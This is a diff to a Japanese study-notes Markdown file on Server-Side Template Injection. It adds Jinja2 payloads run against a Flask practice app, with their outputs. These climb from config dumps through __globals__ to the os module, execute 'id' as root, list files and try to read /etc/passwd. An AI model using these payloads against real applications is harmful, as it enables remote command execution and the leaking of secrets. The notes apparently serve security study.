@@ -5,7 +5,6 @@
 - [Server-Side Template Injection](#server-side-template-injection)
   - [概要](#%E6%A6%82%E8%A6%81)
   - [websitesVulnerableToSSTI](#websitesvulnerabletossti)
-    - [jinja2](#jinja2)
   - [tplmap (SSTI practice)](#tplmap-ssti-practice)
     - [setup](#setup)
     - [php](#php)
@@ -18,7 +17,7 @@
     - [python](#python)
       - [eval](#eval-1)
       - [mako](#mako)
-      - [jinja2](#jinja2-1)
+      - [jinja2](#jinja2)
       - [tornado](#tornado)
     - [Ruby](#ruby)
       - [eval](#eval-2)
@@ -63,9 +62,377 @@
 https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md   
 以下のtplmapよりも多くのほぼすべてのテンプレートエンジンの環境があって、しかも`exploit.py`もついてる！！神！！   
 ### jinja2
+(見やすくするために出力結果には適宜改行を入れてる。)   
+#### config
 - `{{config}}`   
 ```txt
-Hello <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>! 
+Hello <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False,
+'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None,
+'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False,
+'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session',
+'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY':
+True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None,
+'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None,
+'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200),
+'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False,
+'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII':
+True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE':
+'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>! 
+```
+- `{{config.__globals__}}`   
+```txt
+Hello ! 
+```
+- `{{config.items()}}`   
+```txt
+Hello dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False),
+('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY',
+None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE',
+False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME',
+'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None),
+('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False),
+('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True),
+('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT',
+datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), 
+('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), 
+('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), 
+('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), 
+('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])! 
+```
+- `{{config.items()[4]}}`   
+```txt
+Hello ! 
+```
+- `{{config.items()[4][1]}}`   
+```txt
+Internal Server Error
+```
+- `{{config[4]}}`   
+```txt
+Hello ! 
+```
+- `{{config[4][1]}}`   
+```txt
+Internal Server Error
+```
+- `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}`   
+```txt
+Internal Server Error
+```
+- `{{config.__class__}}`   
+```txt
+Hello <class 'flask.config.Config'>! 
+```
+- `{{config.__class__.__init__}}`   
+```txt
+Hello <function Config.__init__ at 0x7fc672b83ca0>! 
+```
+- `{{config.__class__.__init__.__globals__}}`   
+```txt
+Hello {'__name__': 'flask.config', '__doc__': '\n flask.config\n ~~~~~~~~~~~~\n\n 
+Implements the configuration related objects.\n\n :copyright: 2010 Pallets\n :license: 
+BSD-3-Clause\n', '__package__': 'flask', '__loader__': 
+<_frozen_importlib_external.SourceFileLoader object at 0x7fc672b7f610>, '__spec__': 
+ModuleSpec(name='flask.config', loader=<_frozen_importlib_external.SourceFileLoader 
+object at 0x7fc672b7f610>, origin='/usr/local/lib/python3.9/site-
+packages/flask/config.py'), '__file__': '/usr/local/lib/python3.9/site-
+packages/flask/config.py', '__cached__': '/usr/local/lib/python3.9/site-
+packages/flask/__pycache__/config.cpython-39.pyc', '__builtins__': {'__name__': 
+'builtins', '__doc__': "Built-in functions, exceptions, and other 
+objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 
+'__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, 
+'__spec__': ModuleSpec(name='builtins', loader=<class 
+'_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in 
+function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-
+in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 
+'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': 
+<built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-
+in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function 
+delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': 
+<built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function 
+format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 
+'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-
+in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 
+'isinstance': <built-in function isinstance>, 'issubclass': <built-in function 
+issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': 
+<built-in function locals>, 'max': <built-in function max>, 'min': <built-in function 
+min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in 
+function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 
+'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-
+in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function 
+sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 
+'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 
+'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 
+'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': 
+<class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': 
+<class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 
+'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 
+'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 
+'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 
+'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 
+'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 
+'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 
+'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 
+'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 
+'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 
+'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 
+'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 
+'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 
+'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 
+'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 
+'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 
+'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 
+'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 
+'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': 
+<class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 
+'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 
+'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': 
+<class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 
+'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 
+'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 
+'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 
+'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 
+'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 
+'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 
+'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 
+'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 
+'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 
+'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 
+'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': 
+<class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 
+'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': 
+<class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 
+'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 
+'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 
+'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 
+'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': 
+<class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D 
+(i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': 
+Copyright (c) 2001-2020 Python Software Foundation. All Rights Reserved. Copyright (c) 
+2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National 
+Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting 
+Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, 
+BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. 
+See www.python.org for more information., 'license': Type license() to see the full 
+license text, 'help': Type help() for interactive help, or help(object) for help about 
+object.}, 'errno': <module 'errno' (built-in)>, 'os': <module 'os' from 
+'/usr/local/lib/python3.9/os.py'>, 'types': <module 'types' from 
+'/usr/local/lib/python3.9/types.py'>, 'import_string': <function import_string at 
+0x7fc672fd5310>, 'json': <module 'flask.json' from '/usr/local/lib/python3.9/site-
+packages/flask/json/__init__.py'>, 'iteritems': <function <lambda> at 0x7fc672beef70>, 
+'string_types': (<class 'str'>,), 'ConfigAttribute': <class 
+'flask.config.ConfigAttribute'>, 'Config': <class 'flask.config.Config'>}! 
+```
+- `{{config.__class__.__init__.__globals__['os']}}`   
+```txt
+Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>! 
+```
+- `{{config.__class__.__init__.__globals__['os'].popen('id')}}`   
+```txt
+Hello <os._wrap_close object at 0x7fc67227c880>! 
+```
+- `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`   
+```txt
+Hello uid=0(root) gid=0(root) groups=0(root) ! 
+```
+#### url_for
+- `{{url_for}}`   
+```txt
+Hello <function url_for at 0x7fc672b945e0>! 
+```
+- `{{url_for.__globals__}}`   
+```txt
+Hello {'__name__': 'flask.helpers', '__doc__': '\n flask.helpers\n ~~~~~~~~~~~~~\n\n 
+Implements various helpers.\n\n :copyright: 2010 Pallets\n :license: BSD-3-Clause\n', 
+'__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader 
+object at 0x7fc672b43b20>, '__spec__': ModuleSpec(name='flask.helpers', loader=
+<_frozen_importlib_external.SourceFileLoader object at 0x7fc672b43b20>, 
+origin='/usr/local/lib/python3.9/site-packages/flask/helpers.py'), '__file__': 
+'/usr/local/lib/python3.9/site-packages/flask/helpers.py', '__cached__': 
+'/usr/local/lib/python3.9/site-packages/flask/__pycache__/helpers.cpython-39.pyc', 
+'__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and 
+other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in 
+slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, 
+'__spec__': ModuleSpec(name='builtins', loader=<class 
+'_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in 
+function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-
+in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 
+'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': 
+<built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-
+in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function 
+delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': 
+<built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function 
+format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 
+'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-
+in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 
+'isinstance': <built-in function isinstance>, 'issubclass': <built-in function 
+issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': 
+<built-in function locals>, 'max': <built-in function max>, 'min': <built-in function 
+min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in 
+function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 
+'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-
+in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function 
+sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 
+'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 
+'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 
+'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': 
+<class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': 
+<class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 
+'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 
+'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 
+'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 
+'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 
+'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 
+'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 
+'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 
+'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 
+'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 
+'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 
+'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 
+'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 
+'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 
+'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 
+'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 
+'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 
+'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 
+'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': 
+<class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 
+'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 
+'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': 
+<class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 
+'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 
+'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 
+'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 
+'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 
+'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 
+'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 
+'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 
+'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 
+'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 
+'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 
+'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': 
+<class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 
+'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': 
+<class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 
+'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 
+'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 
+'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 
+'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': 
+<class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D 
+(i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': 
+Copyright (c) 2001-2020 Python Software Foundation. All Rights Reserved. Copyright (c) 
+2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National 
+Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting 
+Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, 
+BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. 
+See www.python.org for more information., 'license': Type license() to see the full 
+license text, 'help': Type help() for interactive help, or help(object) for help about 
+object.}, 'io': <module 'io' from '/usr/local/lib/python3.9/io.py'>, 'mimetypes': 
+<module 'mimetypes' from '/usr/local/lib/python3.9/mimetypes.py'>, 'os': <module 'os' 
+from '/usr/local/lib/python3.9/os.py'>, 'pkgutil': <module 'pkgutil' from 
+'/usr/local/lib/python3.9/pkgutil.py'>, 'posixpath': <module 'posixpath' from 
+'/usr/local/lib/python3.9/posixpath.py'>, 'socket': <module 'socket' from 
+'/usr/local/lib/python3.9/socket.py'>, 'sys': <module 'sys' (built-in)>, 'unicodedata': 
+<module 'unicodedata' from '/usr/local/lib/python3.9/lib-dynload/unicodedata.cpython-39-
+x86_64-linux-gnu.so'>, 'update_wrapper': <function update_wrapper at 0x7fc673c971f0>, 
+'RLock': <function RLock at 0x7fc6739bd820>, 'time': <built-in function time>, 
+'adler32': <built-in function adler32>, 'FileSystemLoader': <class 
+'jinja2.loaders.FileSystemLoader'>, 'Headers': <class 
+'werkzeug.datastructures.Headers'>, 'BadRequest': <class 
+'werkzeug.exceptions.BadRequest'>, 'NotFound': <class 'werkzeug.exceptions.NotFound'>, 
+'RequestedRangeNotSatisfiable': <class 
+'werkzeug.exceptions.RequestedRangeNotSatisfiable'>, 'BuildError': <class 
+'werkzeug.routing.BuildError'>, 'url_quote': <function url_quote at 0x7fc672fecf70>, 
+'wrap_file': <function wrap_file at 0x7fc672cdd820>, 'fspath': <built-in function 
+fspath>, 'PY2': False, 'string_types': (<class 'str'>,), 'text_type': <class 'str'>, 
+'_app_ctx_stack': <werkzeug.local.LocalStack object at 0x7fc672bf4310>, 
+'_request_ctx_stack': <werkzeug.local.LocalStack object at 0x7fc672be6f10>, 
+'current_app': <Flask 'server'>, 'request': <Request 'http://192.168.99.100:5000/' 
+[POST]>, 'session': <NullSession {}>, 'message_flashed': <flask.signals._FakeSignal 
+object at 0x7fc672b867c0>, '_missing': <object object at 0x7fc672d8b4b0>, 
+'_os_alt_seps': [], 'get_env': <function get_env at 0x7fc672b94040>, 'get_debug_flag': 
+<function get_debug_flag at 0x7fc672b940d0>, 'get_load_dotenv': <function 
+get_load_dotenv at 0x7fc672b943a0>, '_endpoint_from_view_func': <function 
+_endpoint_from_view_func at 0x7fc672b94430>, 'stream_with_context': <function 
+stream_with_context at 0x7fc672b944c0>, 'make_response': <function make_response at 
+0x7fc672b94550>, 'url_for': <function url_for at 0x7fc672b945e0>, 
+'get_template_attribute': <function get_template_attribute at 0x7fc672b94670>, 'flash': 
+<function flash at 0x7fc672b94700>, 'get_flashed_messages': <function 
+get_flashed_messages at 0x7fc672b94790>, 'send_file': <function send_file at 
+0x7fc672b94820>, 'safe_join': <function safe_join at 0x7fc672b948b0>, 
+'send_from_directory': <function send_from_directory at 0x7fc672b94940>, 
+'get_root_path': <function get_root_path at 0x7fc672b949d0>, 
+'_matching_loader_thinks_module_is_package': <function 
+_matching_loader_thinks_module_is_package at 0x7fc672b94a60>, '_find_package_path': 
+<function _find_package_path at 0x7fc672b94af0>, 'find_package': <function find_package 
+at 0x7fc672b94b80>, 'locked_cached_property': <class 
+'flask.helpers.locked_cached_property'>, '_PackageBoundObject': <class 
+'flask.helpers._PackageBoundObject'>, 'total_seconds': <function total_seconds at 
+0x7fc672b94c10>, 'is_ip': <function is_ip at 0x7fc672b933a0>}! 
+```
+- `{{url_for.__globals__.__getitem__}}`   
+```txt
+Hello <built-in method __getitem__ of dict object at 0x7fc672baeec0>! 
+```
+- `{{url_for.__globals__.__getitem__('os')}}`   
+```txt
+Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>! 
+```
+- `{{url_for.__globals__.__getitem__('os').listdir('./')}}`   
+```txt
+Hello ['server.py', 'run.sh', 'requirements.sh']! 
+```
+- `{{url_for.__globals__['os']}}`   
+```txt
+Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>! 
+```
+- `{{url_for.__globals__['os'].listdir('./')}}`   
+```txt
+Hello ['server.py', 'run.sh', 'requirements.sh']! 
+```
+- `{{url_for.__globals__['os'].popen('id').read()}}`   
+```txt
+Hello uid=0(root) gid=0(root) groups=0(root) ! 
+```
+- `{{url_for.__globals__['current_app']}}`   
+```txt
+Hello <Flask 'server'>! 
+```
+- `{{url_for.__globals__['current_app'].config}}`   
+```txt
+Hello <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 
+'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 
+'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 
+'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 
+'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': 
+True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 
+'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 
+'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 
+'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 
+'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': 
+True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 
+'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>! 
+```
+#### request
+- ``   
+```txt
+
+```
+- ``   
+```txt
+
+```
+- ``   
+```txt
+
+```
+- ``   
+```txt
+
+```
+- ``   
+```txt
+
 ```
 
 ## tplmap (SSTI practice)
